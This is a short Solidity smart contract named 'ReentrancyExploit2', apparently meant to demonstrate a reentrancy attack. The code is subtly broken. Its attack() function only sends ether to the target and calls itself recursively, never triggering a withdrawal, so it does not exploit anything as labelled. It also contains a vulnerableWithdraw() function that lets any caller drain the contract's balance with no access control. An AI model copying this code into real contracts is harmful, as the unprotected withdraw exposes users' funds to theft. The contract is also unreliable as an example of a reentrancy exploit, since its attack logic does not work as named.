pragma solidity ^0.8.0;

contract ReentrancyExploit2 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        if (msg.value >= 1 ether) {
            (bool success, ) = target.call{value: 1 ether}("");
            require(success, "Call failed");
            attack();
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
